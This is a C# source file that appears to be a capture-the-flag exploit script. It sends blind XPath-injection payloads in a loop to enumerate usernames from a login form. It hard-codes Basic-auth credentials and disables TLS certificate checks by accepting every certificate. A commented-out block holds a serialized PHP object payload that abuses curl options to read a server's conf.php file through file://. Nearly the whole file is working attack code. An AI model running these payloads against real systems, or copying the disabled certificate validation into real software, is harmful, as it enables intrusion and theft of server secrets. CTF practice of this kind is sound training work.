using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.IO;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Web; 
namespace Scripts
{
    class HTTP
    {
        public void work()
        {   
            WebClient wc = new WebClient();
            ServicePointManager.ServerCertificateValidationCallback += ValidateRemoteCertificate;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3;
            string credentials = Convert.ToBase64String(
                Encoding.ASCII.GetBytes("ehd2" + ":" + "3w61ZWnXTg"));
            wc.Headers[HttpRequestHeader.Authorization] = string.Format(
                "Basic {0}", credentials);
            
           
            int i = 0;
            bool c = true;

            wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
            string Ht = "";
            int a = (int)'a';
            do
            {


                var p = "' or substring(/users/user/name/text(),1,1)='"+(char)a;
                var myParameters = "pass=pass&login=login&user=" + p;
                 
                Ht = wc.UploadString("https://172.16.254.19/ctf/fdf98f85e4d50317e142835149d96a07/web250/index.php", myParameters);
                a++;
                Console.WriteLine(Ht);
            } while (Ht.Contains(" Wrong :D"));
            Console.WriteLine((char)a);
            
            /*
                                    i++;
                                    String aa = "O:3:'GET':2:{s:3:'url';s:42:'http://pwn.haxors.org/monkeybase-reloaded/';s:7:'context';a:14:{i:19913;b:1;i:42;b:0;i:52;b:0;i:10102;s:0:'';i:10018;s:6:'spider';i:58;b:1;i:78;i:120;i:13;i:120;i:68;i:10;i:81;i:0;i:64;b:0;i:41;i:0;i:10023;a:1:{i:0;s:43:'Authentication : Basic Y3RmOmN0ZnB3bnp6aHVo';}i:10002;s:49:'file:///var/www/html/monkeybase-reloaded/conf.php';}}".Replace('\'', '"'); 
                                    String pay  = HttpUtility.UrlEncode(aa);
                                    Console.WriteLine(pay);
                                    var str = wc.DownloadString("http://pwn.haxors.org/monkeybase-reloaded/?conf=" +pay);
                                    //Console.WriteLine(a);
                                    c = false;
                                    File.WriteAllText("getPage.html", str);
                  */             

                    Console.WriteLine("NO ");
                
       
    
                  
        }

        private static bool ValidateRemoteCertificate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors error)
        {
            // If the certificate is a valid, signed certificate, return true.
            if (error == System.Net.Security.SslPolicyErrors.None)
            {
                return true;
            }
            return true;
            Console.WriteLine("X509Certificate [{0}] Policy Error: '{1}'",
                cert.Subject,
                error.ToString());

            return false;
        }
    }
}
